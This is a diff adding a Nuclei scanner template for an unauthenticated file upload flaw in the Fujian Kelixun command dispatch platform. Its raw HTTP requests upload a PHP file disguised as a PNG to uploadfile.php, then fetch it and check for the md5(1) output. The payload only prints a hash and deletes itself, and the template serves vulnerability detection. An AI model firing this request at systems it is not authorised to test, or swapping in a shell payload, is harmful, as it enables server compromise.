@@ -1,0 +1,53 @@
+id: klx-uploadfile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 福建科立讯通信有限公司指挥调度管理平台upload.php、task/uploadfile.php、event/uploadfile.php多处接口存在文件上传漏洞，未经身份认证的攻击者可通给该漏洞写入后门文件，可导致服务器失陷。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F2-6%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1-%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=f2-6%e7%a6%8f%e5%bb%ba%e7%a7%91%e7%ab%8b%e8%ae%af%e9%80%9a%e4%bf%a1-%e6%8c%87%e6%8c%a5%e8%b0%83%e5%ba%a6%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /custom/zx/event/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imageapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Length: 390
+
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Content-Disposition: form-data; name="uuid"
+
+        1
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Content-Disposition: form-data; name="number"
+
+        200
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Content-Disposition: form-data; name="uploadfile";filename="d.php"
+        Content-Type: image/png
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
+      - |+
+        GET /upload/event/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: body_1
+        regex:
+          - '[a-zA-Z0-9-]+\.php'
